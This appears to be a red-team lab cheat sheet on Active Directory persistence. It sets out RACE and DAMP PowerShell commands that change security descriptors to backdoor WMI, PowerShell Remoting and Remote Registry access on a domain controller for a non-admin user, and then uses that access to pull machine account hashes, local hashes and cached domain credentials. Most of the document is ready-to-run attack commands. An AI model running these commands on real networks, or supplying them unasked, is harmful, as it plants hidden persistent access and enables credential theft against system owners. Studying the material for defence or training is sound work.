- It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.
- Administrative privileges are required for this.
- It, of course, works as a very useful and impactful backdoor mechanism.
### Persistence using ACLs - Security Descriptors - WMI
ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
```
. C:\AD\Tools\RACE-master\RACE.ps1
```
- On local machine for student1:
```
Set-RemoteWMI -SamAccountName student1 -Verbose
```
- On remote machine for student1 without explicit credentials:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
- On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
```
- On remote machine remove permissions:
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```

### Persistence using ACLs - Security Descriptors - PowerShell Remoting
Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches
- On local machine for student1:
```
Set-RemotePSRemoting -SamAccountName student1 -Verbose
```
- On remote machine for student1 without credentials:
```
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
```
- On remote machine, remove the permissions:
```
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
```

### Persistence using ACLs - Security Descriptors - Remote Registry
- Using RACE or DAMP, with admin privs on remote machine
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```
- As student1, retrieve machine account hash:
```
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
- Retrieve local account hash:
```
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```
- Retrieve domain cached credentials:
```
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

